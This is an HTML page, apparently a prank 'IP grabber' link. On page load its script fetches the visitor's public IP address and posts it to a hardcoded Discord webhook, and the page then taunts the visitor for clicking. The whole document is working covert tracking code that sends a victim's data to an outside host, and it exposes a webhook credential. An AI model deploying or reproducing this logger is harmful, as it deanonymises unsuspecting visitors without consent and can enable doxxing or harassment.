<!DOCTYPE html>
<html>
  <head>
    <title>IP Address Tracker</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="style.css">

    <script>
      async function getIPAddress() {
        try {
          const response = await fetch('https://api.ipify.org?format=json');
          const data = await response.json();
          return data.ip;
        } catch (error) {
          console.error('Error fetching IP address:', error);
          return null;
        }
      }

      async function sendToDiscord(ipAddress) {
        const webhookUrl = 'https://ptb.discord.com/api/webhooks/1272897081559875668/EXYG6jWYADvwoPelsoViZJR-dNicMoG02tqaMXzEoxpXojAaImkl3FaNfrOwnlbkwgwu'; // Replace with your Discord webhook URL
        const message = {
          content: `User's IP Address: ${ipAddress}`,
        };

        try {
          const response = await fetch(webhookUrl, {
            method: 'POST',
            body: JSON.stringify(message),
            headers: {
              'Content-Type': 'application/json',
            },
          });
          if (!response.ok) {
            console.error('Error sending message to Discord webhook:', response.statusText);
          }
        } catch (error) {
          console.error('Error sending message to Discord webhook:', error);
        }
      }

      (async function() {
        const ipAddress = await getIPAddress();
        if (ipAddress) {
          await sendToDiscord(ipAddress);
        }
      })();
    </script>
  </head>
  <body>
    <h1 class="rgb-flicks">Thanks for your IP Cuh </li></h1>
    <p>Erm What the sigma why would you click?</p>.
  </body>
</html>
